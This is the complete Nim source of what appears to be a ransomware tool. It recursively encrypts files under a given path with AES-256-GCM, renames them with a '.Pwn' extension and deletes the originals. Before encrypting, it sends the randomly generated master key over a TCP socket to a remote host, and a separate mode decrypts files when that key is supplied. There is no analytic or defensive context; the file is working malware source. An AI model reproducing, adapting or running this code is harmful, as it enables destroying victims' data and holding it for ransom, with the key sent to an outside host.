#[
per file:
key = aes(master, sha(filename & filesize))

different key per file using their initial filename and filesize
]#

import std/[os, net, strformat, strutils, sha1, sysrand, threadpool]
import nimcrypto

const
  AES_256_KEY_SIZE = 32
  AES_BLOCK_SIZE = 16
  FILE_SIZE = 1 * 1024 * 1024 * 1024
  EXT = "Pwn"

type fcn = proc(key: seq[byte], x: string) {.gcsafe, thread.}

proc decrypt(key: seq[byte], fn: string) =
  var
    output = changeFileExt(fn, "")
    ct = cast[seq[byte]](readFile(fn))
    pt = newSeq[byte](len(ct))
    ctx: GCM[aes256]
  ctx.init(key, [], [])
  ctx.decrypt(ct, pt)
  writeFile(output, pt)
  removeFile(fn)

proc encrypt(key: seq[byte], fn: string) =
  var
    output = fmt"{fn}.{EXT}"
    pt = cast[seq[byte]](readFile(fn))
    ct = newSeq[byte](len(pt))
    ctx: GCM[aes256]
  ctx.init(key, [], [])
  ctx.encrypt(pt, ct)
  writeFile(output, ct)
  removeFile(fn)

proc genKey(master: seq[byte], filename: string, filesize: BiggestInt): seq[byte] =
  var fn = filename
  if filename.endsWith(EXT):
    fn.removeSuffix(fmt".{EXT}")
  var
    ctx: GCM[aes256]
    nonce = cast[seq[byte]]($secureHash(fn & $filesize))[0..AES_BLOCK_SIZE]
    key = newSeq[byte](AES_256_KEY_SIZE)
  ctx.init(master, [], [])
  ctx.encrypt(nonce, key)
  return key

proc walk(path: string, master: seq[byte], act: fcn) =
  if(fileExists(path)):
    let key = genKey(master, path, getFileSize(path))
    act(key, path)
    return
  for entry in walkDirRec(path):
    if entry.fileExists:
      let
        fs  = getFileSize(entry)
        key = genKey(master, entry, fs)
      if fs >= FILE_SIZE:
        spawn act(key, entry)
      else:
        act(key, entry)

proc sendKeyIv(host: (string, Port), key: seq[byte]) =
  var server = newSocket()
  connect(server, host[0], host[1])
  send(server, toHex(key) & "\n")
  close(server)

proc main() =
  if(paramCount() < 3):
    stdout.write dedent fmt"""
    usage:
      {paramStr(0)} e [path] [ip] [port]
      {paramStr(0)} d [path] [key]
    """
    quit 0

  case paramStr(1)[0]:
    of 'e':
      let
        path = paramStr(2)
        ip = paramStr(3)
        port = Port parseUInt paramStr(4)
        master = urandom(AES_256_KEY_SIZE)
      sendKeyIv((ip, port), master)
      try: walk(path, master, encrypt)
      except: zeroMem(unsafeAddr master[0], AES_256_KEY_SIZE)
      sync()
    of 'd':
      let
        path = paramStr(2)
        master = cast[seq[byte]](parseHexStr paramStr(3))
      try: walk(path, master, decrypt)
      except: zeroMem(unsafeAddr master[0], AES_256_KEY_SIZE)
      sync()
    else:
      stderr.write "neither e(ncrypt) or d(ecrypt): aborting\n"
      quit 1

main()
